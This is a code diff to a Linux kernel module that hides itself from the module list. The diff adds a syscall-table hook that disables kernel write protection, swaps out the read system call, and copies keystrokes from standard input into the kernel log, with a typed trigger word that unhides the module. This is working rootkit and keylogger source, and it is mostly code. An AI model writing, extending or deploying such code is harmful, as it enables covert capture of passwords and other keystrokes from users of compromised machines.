@@ -10,21 +10,11 @@
 
 #include <linux/module.h>
 #include <linux/kernel.h>
-/* #include <linux/sched.h> */
 #include <linux/delay.h>
-/* #include <linux/reboot.h> */
-/* #include <linux/moduleparam.h> */
-/* #include <linux/fs.h> */
-/* #include <linux/pid_namespace.h> */
-/* #include <linux/ptrace.h> */
-/* #include <linux/dirent.h> */
-/* #include <linux/slab.h> */
 #include <linux/list.h>
 #include <linux/kobject.h>
-/* #include <linux/uaccess.h> */
 #include <asm/paravirt.h>
-/* #include "sysmap.h" */
-/* #include "proc_internal.h" */
+
 #define STATE_MODULES_VISIBLE 0
 #define STATE_MODULES_HIDDEN 1
 
@@ -117,11 +107,78 @@ void disable_module_hiding(void)
   modules_state = STATE_MODULES_VISIBLE;
 }
 
+void disable_ro(void)
+{
+    write_cr0(read_cr0() & ~X86_CR0_WP);
+    barrier();
+}
+
+void enable_ro(void)
+{
+    write_cr0(read_cr0() | X86_CR0_WP);
+    barrier();
+}
+
+#define syscalls ((void**)SM_sys_call_table)
+
+int (*asmlinkage old_read_func)(int fd, void* buf, size_t count);
+
+atomic_t active_read_calls = ATOMIC_INIT(0);
+
+asmlinkage int fake_read(int fd, void* buf, size_t count)
+{
+    char mybuf[2];
+    int ret, i;
+    atomic_inc(&active_read_calls);
+
+    ret = old_read_func(fd, buf, count);
+
+    if (fd == 0)
+    {
+        if (strstr(buf, "unhidemodule"))
+        {
+            unhide_module(&__this_module);
+            disable_module_hiding();
+        }
+        else
+        {
+            printk(KERN_INFO);
+            mybuf[1] = '\0';
+            for (i = 0; i < ret; i++)
+            {
+                mybuf[0] = ((char*)buf)[i];
+                if ((mybuf[0] < ' ') || (mybuf[0] > '~')) continue;
+                printk(mybuf);
+            }
+            printk("\n");
+        }
+    }
+
+    atomic_dec(&active_read_calls);
+    return ret;
+}
+
+void hook_read(void)
+{
+    disable_ro();
+    old_read_func = syscalls[__NR_read];
+    syscalls[__NR_read] = fake_read;
+    enable_ro();
+}
+
+void unhook_read(void)
+{
+    disable_ro();
+    syscalls[__NR_read] = old_read_func;
+    enable_ro();
+}
+
 int init_module(void){
     printk(KERN_INFO "Module hiding loaded.\n");
 
     enable_module_hiding();
     hide_module(&__this_module);
+    hook_read();
 
     return 0;
 }
@@ -131,6 +188,7 @@ void cleanup_module(void){
 
     unhide_module(&__this_module);
     disable_module_hiding();
+    unhook_read();
     // Prevent other CPUs from crashing due to running unloaded code
     // Not too pretty but should be fine
     /* while (atomic_read(&active_calls) != 0) */
